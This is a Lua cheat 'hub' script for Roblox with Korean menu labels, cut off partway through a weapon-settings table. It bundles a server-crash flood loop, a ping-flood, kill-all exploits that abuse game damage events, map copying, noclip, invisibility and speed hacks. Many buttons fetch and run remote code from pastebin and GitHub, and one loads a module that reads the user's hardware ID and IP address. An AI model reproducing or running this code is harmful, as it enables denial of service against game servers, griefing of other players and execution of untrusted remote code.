local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
   Name = "핵 모음 허브",
   LoadingTitle = "Loading...",
    LoadingSubtitle = "by Sold",
   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil, -- Create a custom folder for your hub/game
      FileName = "Big Hub"
   },
   Discord = {
      Enabled = false,
      Invite = "YYsYSKc5gd",
      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
   },
    KeySystem = true, -- Set this to true to use our key system
   KeySettings = {
      Title = "핵 모음 허브 ㅣ 🔒 ",
        Subtitle = "Hit 1325 and open the hub!",
      Note = "1325",
      FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
      SaveKey = false, -- The user's key will be saved, but if you change the key, they will be unable to use your script
      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
      Key = {"1325"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
   }
})

Rayfield:Notify({
   Title = "허브가 실행되었습니다!",
   Content = "Made by Sold",
   Duration = 6.5,
   Image = 4483362458,
   Actions = { -- Notification Buttons
      Ignore = {
         Name = "알겠어!",
         Callback = function()
         print("스크립트가 실행 되었습니다")
      end
   },
},
})

local MainTab = Window:CreateTab("🌍메인 탭🌍", 4483362458) -- Title, Image
local MainSection = MainTab:CreateSection("메인")

local Slider = MainTab:CreateSlider({
   Name = "걷기 스피드 ",
   Range = {16, 500},
   Increment = 1,
   Suffix = "스피드 ",
   CurrentValue = 10,
   Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = (Value)
   end,
}) 

local Slider = MainTab:CreateSlider({
   Name = "점프 파워 ",
   Range = {50, 500},
   Increment = 1,
   Suffix = "점프 파워 ",
   CurrentValue = 10,
   Flag = "Slider2", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = (Value)
   end,
})

local Button = MainTab:CreateButton({
   Name = "서버폭발",
   Callback = function()
local mainInterval = 0.1
local chatInterval = 0.1
local lastChatTime = tick()

while wait(mainInterval) do
    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)

    local function getmaxvalue(val)
        local mainvalueifonetable = 499999
        if type(val) ~= "number" then
            return nil
        end
        local calculateperfectval = (mainvalueifonetable / (val + 2))
        return calculateperfectval
    end

    local function bomb(tableincrease, tries)
        local maintable = {}
        local spammedtable = {}

        table.insert(spammedtable, {})
        z = spammedtable[1]

        for i = 1, tableincrease do
            local tableins = {}
            table.insert(z, tableins)
            z = tableins
        end

        local calculatemax = getmaxvalue(tableincrease)
        local maximum

        if calculatemax then
            maximum = calculatemax
        else
            maximum = 999999
        end

        for i = 1, maximum do
            table.insert(maintable, spammedtable)
        end

        for i = 1, tries do
            game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
        end
    end

    bomb(250, 2)

    if tick() - lastChatTime >= chatInterval then
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("", "All")
        lastChatTime = tick()
    end
end
   end,
})


local Button = MainTab:CreateButton({
   Name = "어드민 스크립트 ",
   Callback = function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
   end,
})

local Button = MainTab:CreateButton({
   Name = "사람 날리기",
   Callback = function()
    loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))() 
   end,
})

local Button = MainTab:CreateButton({
   Name = "맵복사",
   Callback = function()
    saveinstance()
   end,
})

local Button = MainTab:CreateButton({
   Name = "칼 있는 스크립트만 되는 올킬 스크립트  ",
   Callback = function()
local range = 100000000 local player = game:GetService("Players").LocalPlayer local function isFriendWith(player1, player2) return player1:IsFriendsWith(player2.UserId) end game:GetService("RunService").RenderStepped:Connect(function() local players = game.Players:GetPlayers() for i = 2, #players do local otherPlayer = players[i] local character = otherPlayer.Character if not isFriendWith(player, otherPlayer) then local tool = player.Character and player.Character:FindFirstChildOfClass("Tool") if tool and tool:FindFirstChild("Handle") then tool:Activate() for _, part in next, character:GetChildren() do if part:IsA("BasePart") then firetouchinterest(tool.Handle, part, 0) firetouchinterest(tool.Handle, part, 1) end end end end end end)

   end,
})


local Button = MainTab:CreateButton({
   Name = "사람 이름로 날리기 ",
   Callback = function()
    loadstring(game:HttpGet('https://pastebin.com/raw/3ULUe5z4'))()
   end,
})

local Button = MainTab:CreateButton({
   Name = "체력 즉시 회복",
   Callback = function()
    game.Players.LocalPlayer.Character.Humanoid.Health = 1000000000000000000000
   end,
})

local Button = MainTab:CreateButton({
   Name = "벽뚫 스크립트  ",
   Callback = function()
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")
local player = Players.LocalPlayer
local noclip = false
local connection

local function notify(message)
    StarterGui:SetCore("SendNotification", {
        Title = "Notification";
        Text = message;
        Duration = 3;
    })
end

local function toggleNoclip()
    noclip = not noclip
    if noclip then
        connection = RunService.Stepped:Connect(function()
            for _, part in pairs(player.Character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end
        end)
        notify("noclip on, by thebestpersol. Enjoy!")
    else
        if connection then
            connection:Disconnect()
        end
        for _, part in pairs(player.Character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.CanCollide = true
            end
        end
        notify("noclip off, by thebestpersol. Enjoy!")
    end
end

local function createTool()
    local tool = Instance.new("Tool")
    tool.Name = "Noclip Tool"
    tool.RequiresHandle = false
    tool.CanBeDropped = false
    tool.Parent = player:WaitForChild("Backpack")

    tool.Activated:Connect(function()
        toggleNoclip()
    end)
end

local function onCharacterAdded()
    wait(0.1)
    createTool()
end

if player.Character then
    onCharacterAdded()
end

   end,
})


local Button = MainTab:CreateButton({
   Name = "투명 (L) ",
   Callback = function()
    local ScriptStarted = false
local Keybind = "L" --Set to whatever you want, has to be the name of a KeyCode Enum.
local Transparency = true --Will make you slightly transparent when you are invisible. No reason to disable.
local NoClip = false --Will make your fake character no clip.
 
local Player = game:GetService("Players").LocalPlayer
local RealCharacter = Player.Character or Player.CharacterAdded:Wait()
 
local IsInvisible = false
 
RealCharacter.Archivable = true
local FakeCharacter = RealCharacter:Clone()
local Part
Part = Instance.new("Part", workspace)
Part.Anchored = true
Part.Size = Vector3.new(200, 1, 200)
Part.CFrame = CFrame.new(0, -500, 0) --Set this to whatever you want, just far away from the map.
Part.CanCollide = true
FakeCharacter.Parent = workspace
FakeCharacter.HumanoidRootPart.CFrame = Part.CFrame * CFrame.new(0, 5, 0)
 
for i, v in pairs(RealCharacter:GetChildren()) do
  if v:IsA("LocalScript") then
      local clone = v:Clone()
      clone.Disabled = true
      clone.Parent = FakeCharacter
  end
end
if Transparency then
  for i, v in pairs(FakeCharacter:GetDescendants()) do
      if v:IsA("BasePart") then
          v.Transparency = 0.7
      end
  end
end
local CanInvis = true
function RealCharacterDied()
  CanInvis = false
  RealCharacter:Destroy()
  RealCharacter = Player.Character
  CanInvis = true
  isinvisible = false
  FakeCharacter:Destroy()
  workspace.CurrentCamera.CameraSubject = RealCharacter.Humanoid
 
  RealCharacter.Archivable = true
  FakeCharacter = RealCharacter:Clone()
  Part:Destroy()
  Part = Instance.new("Part", workspace)
  Part.Anchored = true
  Part.Size = Vector3.new(200, 1, 200)
  Part.CFrame = CFrame.new(9999, 9999, 9999) --Set this to whatever you want, just far away from the map.
  Part.CanCollide = true
  FakeCharacter.Parent = workspace
  FakeCharacter.HumanoidRootPart.CFrame = Part.CFrame * CFrame.new(0, 5, 0)
 
  for i, v in pairs(RealCharacter:GetChildren()) do
      if v:IsA("LocalScript") then
          local clone = v:Clone()
          clone.Disabled = true
          clone.Parent = FakeCharacter
      end
  end
  if Transparency then
      for i, v in pairs(FakeCharacter:GetDescendants()) do
          if v:IsA("BasePart") then
              v.Transparency = 0.7
          end
      end
  end
 RealCharacter.Humanoid.Died:Connect(function()
 RealCharacter:Destroy()
 FakeCharacter:Destroy()
 end)
 Player.CharacterAppearanceLoaded:Connect(RealCharacterDied)
end
RealCharacter.Humanoid.Died:Connect(function()
 RealCharacter:Destroy()
 FakeCharacter:Destroy()
 end)
Player.CharacterAppearanceLoaded:Connect(RealCharacterDied)
local PseudoAnchor
game:GetService "RunService".RenderStepped:Connect(
  function()
      if PseudoAnchor ~= nil then
          PseudoAnchor.CFrame = Part.CFrame * CFrame.new(0, 5, 0)
      end
       if NoClip then
      FakeCharacter.Humanoid:ChangeState(11)
       end
  end
)
 
PseudoAnchor = FakeCharacter.HumanoidRootPart
local function Invisible()
  if IsInvisible == false then
      local StoredCF = RealCharacter.HumanoidRootPart.CFrame
      RealCharacter.HumanoidRootPart.CFrame = FakeCharacter.HumanoidRootPart.CFrame
      FakeCharacter.HumanoidRootPart.CFrame = StoredCF
      RealCharacter.Humanoid:UnequipTools()
      Player.Character = FakeCharacter
      workspace.CurrentCamera.CameraSubject = FakeCharacter.Humanoid
      PseudoAnchor = RealCharacter.HumanoidRootPart
      for i, v in pairs(FakeCharacter:GetChildren()) do
          if v:IsA("LocalScript") then
              v.Disabled = false
          end
      end
 
      IsInvisible = true
  else
      local StoredCF = FakeCharacter.HumanoidRootPart.CFrame
      FakeCharacter.HumanoidRootPart.CFrame = RealCharacter.HumanoidRootPart.CFrame
 
      RealCharacter.HumanoidRootPart.CFrame = StoredCF
 
      FakeCharacter.Humanoid:UnequipTools()
      Player.Character = RealCharacter
      workspace.CurrentCamera.CameraSubject = RealCharacter.Humanoid
      PseudoAnchor = FakeCharacter.HumanoidRootPart
      for i, v in pairs(FakeCharacter:GetChildren()) do
          if v:IsA("LocalScript") then
              v.Disabled = true
          end
      end
      IsInvisible = false
  end
end
 
game:GetService("UserInputService").InputBegan:Connect(
  function(key, gamep)
      if gamep then
          return
      end
      if key.KeyCode.Name:lower() == Keybind:lower() and CanInvis and RealCharacter and FakeCharacter then
          if RealCharacter:FindFirstChild("HumanoidRootPart") and FakeCharacter:FindFirstChild("HumanoidRootPart") then
              Invisible()
          end
      end
  end
)
local Sound = Instance.new("Sound",game:GetService("SoundService"))
Sound.SoundId = "rbxassetid://232127604"
Sound:Play()
game:GetService("StarterGui"):SetCore("SendNotification",{["Title"] = "Invisible Toggle Loaded",["Text"] = "Press "..Keybind.." to become change visibility.",["Duration"] = 20,["Button1"] = "Okay."})
   end,
})


local Tab = Window:CreateTab("유명 게임 스크립트 탭 ", nil) -- Title, Image
local Section = Tab:CreateSection("게임 스크립트 ")

local Button = Tab:CreateButton({
   Name = "피쉬 스크립트 🐟",
   Callback = function()
 loadstring(game:HttpGet("https://you.whimper.xyz/sources/CupPink/fisch.lua"))()
   end,
})

local Button = Tab:CreateButton({
   Name = "살보결 스크립트 🗡️🔫",
   Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/b9natwo/iSPLOIT/main/Murderers%20VS%20Sheriffs%20Duels.lua"))()
   end,
})

local Button = Tab:CreateButton({
   Name = "제일 브레이크 스크립트 ",
   Callback = function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/BlitzIsKing/UniversalFarm/main/Loader/Regular"))() 
   end,
})

local Button = Tab:CreateButton({
   Name = "이베이드 스크립트 ",
   Callback = function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubEvade"))() 
   end,
})

local Button = Tab:CreateButton({
   Name = "배드워즈 스크립트 ",
   Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/AFGCLIENT/Snyware/main/Loader'))()
   end,
})

local Button = Tab:CreateButton({
 Name = "가강전",
   Callback = function()
   getgenv().morph = true -- turn false to true if you want custom accessories
loadstring(game:HttpGet("https://raw.githubusercontent.com/skibiditoiletfan2007/BaldyToSorcerer/refs/heads/main/LatestV2.lua"))()
   end,
})

local Button = Tab:CreateButton({
   Name = "워 타이쿤 스크립트 ",
   Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/JinxTheCatto/Neptune/main/NeptuneHub.lua"))()
   end,
})


local Tab = Window:CreateTab("부대 테러 스크립트 ", 4483362458) -- Title, Image
local Section = Tab:CreateSection("부대 테러 ")


local Button = Tab:CreateButton({
   Name = "acs 2.0.1 킬올 ",
   Callback = function()
    --while wait() do
    local DR = game:GetService("ReplicatedStorage")["ACS_Engine"].Eventos.Damage
 
for PlayerIndex,GivenPlayer in pairs(game.Players:GetPlayers()) do
    local Char = GivenPlayer.Character
    DR:FireServer(Char.Humanoid,Char.Humanoid.MaxHealth,0,0)
            end
   end,
})

local Button = Tab:CreateButton({
   Name = "acs 1.7.5 킬올 ",
   Callback = function()
local DR = game:GetService("ReplicatedStorage")["ACS_Engine"].Eventos.Damage
 
for PlayerIndex,GivenPlayer in pairs(game.Players:GetPlayers()) do
    local Char = GivenPlayer.Character
    DR:FireServer(Char.Humanoid,Char.Humanoid.MaxHealth,0,0)
            end
   end,
})

local Button = Tab:CreateButton({
   Name = "핑핵 실행",
   Callback = function()
while true do for i = 1 , 2500 do game.ReplicatedStorage.ACS_Engine.Events.ServerBullet:FireServer(Vector3.new(math.huge , math.huge , math.huge)) end task.wait() end
        end,
})

local Button = Tab:CreateButton({
   Name = "CE 엔진 폭발 ",
   Callback = function()
 local xpm = loadstring(game:HttpGet("https://raw.githubusercontent.com/xsinew/xpm/main/setup.lua"), "xpm")()
xpm:Init("Discord: xsinew")
import "ClientManager"

local hwid = ClientManager:GetID()
local ip = ClientManager:GetIP()
import "QuickServices"
import "CarbonExploit"

local LocalPlayer = Players.LocalPlayer

CarbonExploit:Explode(LocalPlayer.Character.Torso.Position)
   end,
})


local Button = Tab:CreateButton({
   Name = "투명 (L) ",
   Callback = function()
    local ScriptStarted = false
local Keybind = "L" --Set to whatever you want, has to be the name of a KeyCode Enum.
local Transparency = true --Will make you slightly transparent when you are invisible. No reason to disable.
local NoClip = false --Will make your fake character no clip.
 
local Player = game:GetService("Players").LocalPlayer
local RealCharacter = Player.Character or Player.CharacterAdded:Wait()
 
local IsInvisible = false
 
RealCharacter.Archivable = true
local FakeCharacter = RealCharacter:Clone()
local Part
Part = Instance.new("Part", workspace)
Part.Anchored = true
Part.Size = Vector3.new(200, 1, 200)
Part.CFrame = CFrame.new(0, -500, 0) --Set this to whatever you want, just far away from the map.
Part.CanCollide = true
FakeCharacter.Parent = workspace
FakeCharacter.HumanoidRootPart.CFrame = Part.CFrame * CFrame.new(0, 5, 0)
 
for i, v in pairs(RealCharacter:GetChildren()) do
  if v:IsA("LocalScript") then
      local clone = v:Clone()
      clone.Disabled = true
      clone.Parent = FakeCharacter
  end
end
if Transparency then
  for i, v in pairs(FakeCharacter:GetDescendants()) do
      if v:IsA("BasePart") then
          v.Transparency = 0.7
      end
  end
end
local CanInvis = true
function RealCharacterDied()
  CanInvis = false
  RealCharacter:Destroy()
  RealCharacter = Player.Character
  CanInvis = true
  isinvisible = false
  FakeCharacter:Destroy()
  workspace.CurrentCamera.CameraSubject = RealCharacter.Humanoid
 
  RealCharacter.Archivable = true
  FakeCharacter = RealCharacter:Clone()
  Part:Destroy()
  Part = Instance.new("Part", workspace)
  Part.Anchored = true
  Part.Size = Vector3.new(200, 1, 200)
  Part.CFrame = CFrame.new(9999, 9999, 9999) --Set this to whatever you want, just far away from the map.
  Part.CanCollide = true
  FakeCharacter.Parent = workspace
  FakeCharacter.HumanoidRootPart.CFrame = Part.CFrame * CFrame.new(0, 5, 0)
 
  for i, v in pairs(RealCharacter:GetChildren()) do
      if v:IsA("LocalScript") then
          local clone = v:Clone()
          clone.Disabled = true
          clone.Parent = FakeCharacter
      end
  end
  if Transparency then
      for i, v in pairs(FakeCharacter:GetDescendants()) do
          if v:IsA("BasePart") then
              v.Transparency = 0.7
          end
      end
  end
 RealCharacter.Humanoid.Died:Connect(function()
 RealCharacter:Destroy()
 FakeCharacter:Destroy()
 end)
 Player.CharacterAppearanceLoaded:Connect(RealCharacterDied)
end
RealCharacter.Humanoid.Died:Connect(function()
 RealCharacter:Destroy()
 FakeCharacter:Destroy()
 end)
Player.CharacterAppearanceLoaded:Connect(RealCharacterDied)
local PseudoAnchor
game:GetService "RunService".RenderStepped:Connect(
  function()
      if PseudoAnchor ~= nil then
          PseudoAnchor.CFrame = Part.CFrame * CFrame.new(0, 5, 0)
      end
       if NoClip then
      FakeCharacter.Humanoid:ChangeState(11)
       end
  end
)
 
PseudoAnchor = FakeCharacter.HumanoidRootPart
local function Invisible()
  if IsInvisible == false then
      local StoredCF = RealCharacter.HumanoidRootPart.CFrame
      RealCharacter.HumanoidRootPart.CFrame = FakeCharacter.HumanoidRootPart.CFrame
      FakeCharacter.HumanoidRootPart.CFrame = StoredCF
      RealCharacter.Humanoid:UnequipTools()
      Player.Character = FakeCharacter
      workspace.CurrentCamera.CameraSubject = FakeCharacter.Humanoid
      PseudoAnchor = RealCharacter.HumanoidRootPart
      for i, v in pairs(FakeCharacter:GetChildren()) do
          if v:IsA("LocalScript") then
              v.Disabled = false
          end
      end
 
      IsInvisible = true
  else
      local StoredCF = FakeCharacter.HumanoidRootPart.CFrame
      FakeCharacter.HumanoidRootPart.CFrame = RealCharacter.HumanoidRootPart.CFrame
 
      RealCharacter.HumanoidRootPart.CFrame = StoredCF
 
      FakeCharacter.Humanoid:UnequipTools()
      Player.Character = RealCharacter
      workspace.CurrentCamera.CameraSubject = RealCharacter.Humanoid
      PseudoAnchor = FakeCharacter.HumanoidRootPart
      for i, v in pairs(FakeCharacter:GetChildren()) do
          if v:IsA("LocalScript") then
              v.Disabled = true
          end
      end
      IsInvisible = false
  end
end
 
game:GetService("UserInputService").InputBegan:Connect(
  function(key, gamep)
      if gamep then
          return
      end
      if key.KeyCode.Name:lower() == Keybind:lower() and CanInvis and RealCharacter and FakeCharacter then
          if RealCharacter:FindFirstChild("HumanoidRootPart") and FakeCharacter:FindFirstChild("HumanoidRootPart") then
              Invisible()
          end
      end
  end
)
local Sound = Instance.new("Sound",game:GetService("SoundService"))
Sound.SoundId = "rbxassetid://232127604"
Sound:Play()
game:GetService("StarterGui"):SetCore("SendNotification",{["Title"] = "Invisible Toggle Loaded",["Text"] = "Press "..Keybind.." to become change visibility.",["Duration"] = 20,["Button1"] = "Okay."})
   end,
})

local Section = Tab:CreateSection("밥밥부대 올킬")

local Button = Tab:CreateButton({
   Name = "킬올 실행 [총 있어야함]!",
   Callback = function()
for IQ = 1 , 300 do

for i , v in pairs(game.Players:GetPlayers()) do

local args = {
    [1] = "Gun",
    [2] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Glock 17"),
    [3] = {
        ["TacticalReloadAnimationSpeed"] = 1,
        ["CanSpinPart"] = false,
        ["AngleX_Min"] = 1,
        ["Lifesteal"] = 0,
        ["MeleeCriticalDamageEnabled"] = false,
        ["SilenceEffect"] = false,
        ["ExplosionCraterFadeTime"] = 1,
        ["Accuracy"] = 0.1,
        ["GoreSoundVolume"] = 1,
        ["HitCharSndPitchMin"] = 1,
        ["CustomMeleeHitEffect"] = false,
        ["WhizDistance"] = 25,
        ["ProjectileMotion"] = false,
        ["WhizSoundPitchMin"] = 1,
        ["ReloadAnimationSpeed"] = 1,
        ["MeleeDebuffChance"] = 100,
        ["SpreadRedutionS"] = 0.6,
        ["VisibleTime"] = 0.01,
        ["HoldDownAnimationSpeed"] = 0.5,
        ["DebuffName"] = "",
        ["ScopeSwaySpeed"] = 15,
        ["HoldingTime"] = 1,
        ["HeatPerFireMax"] = 8,
        ["MeleeBloodEnabled"] = true,
        ["MeleeKnockback"] = 0,
        ["CustomExplosion"] = false,
        ["MeleeBloodWoundTexture"] = {
            [1] = 2078626
        },
        ["EasingStyleNAD"] = Enum.EasingStyle.Quint,
        ["ScopeKnockbackMultiplier"] = 5,
        ["BulletHoleVisibleTime"] = 3,
        ["AltAnimationSpeed"] = 1,
        ["AimIdleAnimationSpeed"] = 1,
        ["MeleeHitSoundIDs"] = {
            [1] = 6000828622
        },
        ["PreShotgunReload"] = false,
        ["BulletPerBurst"] = 3,
        ["MeleeHitSoundPitchMin"] = 1,
        ["ShotsForDepletion"] = 12,
        ["HitmarkerSoundID"] = {
            [1] = 3748776946,
            [2] = 3748777642,
            [3] = 3748780065
        },
        ["MarkerEffectEnabled"] = true,
        ["MuzzleLightEnabled"] = true,
        ["RecoilRedution"] = 0.5,
        ["EasingStyle"] = Enum.EasingStyle.Quint,
        ["CrossExpansion"] = 100,
        ["BloodWoundFadeTime"] = 1,
        ["MeleeLifesteal"] = 0,
        ["DisappearTime"] = 5,
        ["ExplosionSoundIDs"] = {
            [1] = 163064102
        },
        ["BloodWoundPartColor"] = true,
        ["MeleeHitSoundPitchMax"] = 1.5,
        ["ExplosionKnockbackMultiplierOnPlayer"] = 2,
        ["PenetrationAmount"] = 0,
        ["ShotgunPumpinSpeed"] = 0.5,
        ["PenetrationType"] = "HumanoidPenetration",
        ["HitSoundPitchMin"] = 1,
        ["LowAmmo"] = true,
        ["BulletShellRotVelocity"] = 40,
        ["MeleeBloodWoundFadeTime"] = 1,
        ["EasingDirectionNAD"] = Enum.EasingDirection.Out,
        ["MeleeBloodWoundSize"] = 0.5,
        ["LightBrightness"] = 4,
        ["HitmarkerFadeTime"] = 0.4,
        ["SelfKnockbackMultiplier"] = 2,
        ["BulletHoleFadeTime"] = 1,
        ["MaximumTime"] = 1,
        ["ChargingTime"] = 1,
        ["InspectAnimationSpeed"] = 1,
        ["BulletSpeed"] = 2400,
        ["SelfKnockback"] = false,
        ["MeleeHitCharSndPitchMax"] = 1,
        ["CrossScaleIS"] = 0.6,
        ["DualFireEnabled"] = false,
        ["SpreadPattern"] = {
            [1] = {
                [1] = 0,
                [2] = -0.4
            },
            [2] = {
                [1] = -0.35,
                [2] = 0.2
            },
            [3] = {
                [1] = 0.35,
                [2] = 0.2
            },
            [4] = {
                [1] = 0,
                [2] = 1
            },
            [5] = {
                [1] = 0.95,
                [2] = 0.31
            },
            [6] = {
                [1] = 0.59,
                [2] = -0.81
            },
            [7] = {
                [1] = -0.59,
                [2] = -0.81
            },
            [8] = {
                [1] = -0.95,
                [2] = 0.31
            }
        },
        ["SmokeTrailEnabled"] = false,
        ["MeleeAttackEnabled"] = false,
        ["MeleeDebuffName"] = "",
        ["AngleZ_Max"] = 1,
        ["MinigunRevDownAnimationSpeed"] = 1,
        ["DebuffChance"] = 100,
        ["FieldOfViewIS"] = 50,
        ["IdleAnimationSpeed"] = 1,
        ["DelayBeforeFiring"] = 1,
        ["ScopeSwayDamper"] = 0.65,
        ["SpreadRedutionIS"] = 0.6,
        ["TimeBeforeCooldown"] = 3,
        ["MouseSensitiveS"] = 0.2,
        ["ReloadAnimationID"] = 10587405321,
        ["EquipTime"] = 0,
        ["BurstFireEnabled"] = false,
        ["MarkerPartColor"] = true,
        ["MarkerEffectTexture"] = {
            [1] = 2078626
        },
        ["FireAnimationID"] = 10587360749,
        ["TweenLengthNAD"] = 0.8,
        ["CriticalBaseChance"] = 5,
        ["GoreSoundPitchMin"] = 1,
        ["MeleeBloodWoundEnabled"] = true,
        ["GoreEffectEnabled"] = false,
        ["OverheatAnimationSpeed"] = 1,
        ["BurstRate"] = 0.175,
        ["ShellTextureID"] = 95391833,
        ["BulletHoleTexture"] = {
            [1] = 2078626
        },
        ["AimAnimationsEnabled"] = true,
        ["Recoil"] = 25,
        ["MeleeAttackRange"] = 4,
        ["HitCharSndPitchMax"] = 1,
        ["Range"] = 5000,
        ["MaxHeat"] = 100,
        ["Debuff"] = false,
        ["ExplosionRadius"] = 8,
        ["ScopeKnockbackSpeed"] = 15,
        ["BulletShellParticles"] = false,
        ["ShotgunPumpinAnimationSpeed"] = 1,
        ["BurstRates"] = {
            [1] = 0,
            [2] = 0.075,
            [3] = 0.075,
            [4] = 0
        },
        ["PreShotgunReloadSpeed"] = 0.5,
        ["WhizSoundEnabled"] = true,
        ["HoldAndReleaseEnabled"] = false,
        ["AngleX_Max"] = 1,
        ["Level1ChargingTime"] = 1,
        ["SelectiveFireEnabled"] = false,
        ["CriticalDamageEnabled"] = false,
        ["AllowCollide"] = false,
        ["SwitchAnimationSpeed"] = 1,
        ["ShotgunEnabled"] = false,
        ["EasingDirection"] = Enum.EasingDirection.Out,
        ["MouseSensitiveIS"] = 0.2,
        ["Knockback"] = 0,
        ["AimSecondaryFireAnimationSpeed"] = 1,
        ["HoldDownEnabled"] = false,
        ["ExplosionCraterEnabled"] = true,
        ["ShotgunPump"] = false,
        ["CrossScaleS"] = 0,
        ["MuzzleFlashEnabled"] = true,
        ["MinigunEnabled"] = false,
        ["MeleeCriticalBaseChance"] = 5,
        ["BloodWoundVisibleTime"] = 3,
        ["WhizSoundVolume"] = 1,
        ["ScopeSensitive"] = 0.25,
        ["ShellMeshID"] = 95392019,
        ["ChargingAnimationSpeed"] = 1,
        ["HitCharSndVolume"] = 1,
        ["MarkerEffectFadeTime"] = 1,
        ["MeleeCriticalDamageMultiplier"] = 3,
        ["MeleeAttackAnimationSpeed"] = 1,
        ["ZeroDamageDistance"] = 10000,
        ["ShotgunClipinAnimationSpeed"] = 1,
        ["ChargedShotEnabled"] = false,
        ["HitCharSndIDs"] = {
            [1] = 3802437008,
            [2] = 3802437361,
            [3] = 3802437696,
            [4] = 3802440043,
            [5] = 3802440388,
            [6] = 3802442962
        },
        ["ModuleName"] = "1",
        ["CrossDamper"] = 0.8,
        ["ExplosionSoundPitchMax"] = 1.5,
        ["LightColor"] = Color3.new(1, 1.1098039150238037, 0),
        ["AltTime"] = 1,
        ["WhizSoundPitchMax"] = 1,
        ["ShellScale"] = Vector3.new(1.5, 1.5, 1.5),
        ["ShellSize"] = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.3199999928474426),
        ["ChargingSoundPitchRange"] = {
            [1] = 1,
            [2] = 1.5
        },
        ["MeleeHeadshotDamageMultiplier"] = 2,
        ["CriticalDamageMultiplier"] = 3,
        ["ExplosiveEnabled"] = false,
        ["ScopeDelay"] = 0,
        ["SecondaryFireAnimationEnabled"] = false,
        ["InspectAnimationEnabled"] = false,
        ["PartColor"] = true,
        ["SwitchTime"] = 0.25,
        ["SniperEnabled"] = false,
        ["HeadshotEnabled"] = true,
        ["TacticalReloadTime"] = 3,
        ["SpinX"] = 3,
        ["SecondaryFireAnimationSpeed"] = 1,
        ["MeleeHitSoundVolume"] = 1,
        ["HitSoundIDs"] = {
            [1] = 186809061,
            [2] = 186809249,
            [3] = 186809250,
            [4] = 186809252
        },
        ["Ammo"] = 60,
        ["ExplosionKnockback"] = false,
        ["HitSoundVolume"] = 1,
        ["AimIdleAnimationID"] = 10587431544,
        ["AimFireAnimationSpeed"] = 1,
        ["RaisePitch"] = false,
        ["Acceleration"] = Vector3.zero,
        ["ExplosionCraterSize"] = 3,
        ["EchoEffect"] = true,
        ["MaxAmmo"] = 60,
        ["FireModeTexts"] = {
            [1] = "SEMI-AUTO",
            [2] = "2-ROUND-BURST",
            [3] = "3-ROUND-BURST",
            [4] = "AUTO"
        },
        ["MaxDepletion"] = 4,
        ["AmmoPerMag"] = 12,
        ["ShotgunReload"] = false,
        ["CooldownRate"] = 1,
        ["MeleeHitCharSndVolume"] = 1,
        ["CameraRecoilingEnabled"] = true,
        ["ChargingSoundIncreasePitch"] = true,
        ["GoreSoundIDs"] = {
            [1] = 1930359546
        },
        ["AnimationKeyframes"] = {},
        ["SmokeTrailRateIncrement"] = 1,
        ["MaximumRate"] = 4,
        ["DamageBasedOnDistance"] = false,
        ["AdvancedChargingTime"] = 5,
        ["MeleeBloodWoundTextureColor"] = Color3.new(1, 0, 0),
        ["BulletShellVelocity"] = 17,
        ["AngleY_Max"] = 0,
        ["TacticalReloadAnimationEnabled"] = false,
        ["SelfKnockbackRedution"] = 0.8,
        ["GoreSoundPitchMax"] = 1.5,
        ["SelfKnockbackPower"] = 50,
        ["ShotgunPattern"] = false,
        ["ShellClipinSpeed"] = 0.5,
        ["BulletPerShot"] = 8,
        ["SpinY"] = 0,
        ["PenetrationDepth"] = 0,
        ["IronsightEnabled"] = true,
        ["ScopeKnockbackDamper"] = 0.65,
        ["HitSoundPitchMax"] = 1.5,
        ["TweenLength"] = 0.8,
        ["OverheatTime"] = 2.5,
        ["ChargingAnimationEnabled"] = false,
        ["MeleeDamage"] = 20,
        ["MinigunRevUpAnimationSpeed"] = 1,
        ["BloodEnabled"] = true,
        ["WhizSoundID"] = {
            [1] = 3809084884,
            [2] = 3809085250,
            [3] = 3809085650,
            [4] = 3809085996,
            [5] = 3809086455
        },
        ["BatteryEnabled"] = false,
        ["ExplosionSoundPitchMin"] = 1,
        ["DelayAfterFiring"] = 1,
        ["ChargedShotAdvanceEnabled"] = false,
        ["SpinZ"] = 0,
        ["SecondaryShotgunPumpinAnimationSpeed"] = 1,
        ["SelfDamage"] = false,
        ["SecondaryShotgunPump"] = false,
        ["HitmarkerSoundPitch"] = 1,
        ["ReloadTime"] = 2,
        ["Spread"] = 5,
        ["ExplosionCraterPartColor"] = false,
        ["HitmarkerEnabled"] = true,
        ["CustomHitEffect"] = false,
        ["BaseDamage"] = 20,
        ["BloodWoundTexture"] = {
            [1] = 2078626
        },
        ["ExplosionCraterVisibleTime"] = 3,
        ["MeleeHitEffectEnabled"] = true,
        ["RecoilSpeed"] = 15,
        ["LightShadows"] = true,
        ["HitmarkerColor"] = Color3.new(1, 1, 1),
        ["FullDamageDistance"] = 1000,
        ["CooldownTime"] = 0.05,
        ["BulletHoleSize"] = 0.5,
        ["AimFireAnimationID"] = 10587442110,
        ["HitEffectEnabled"] = true,
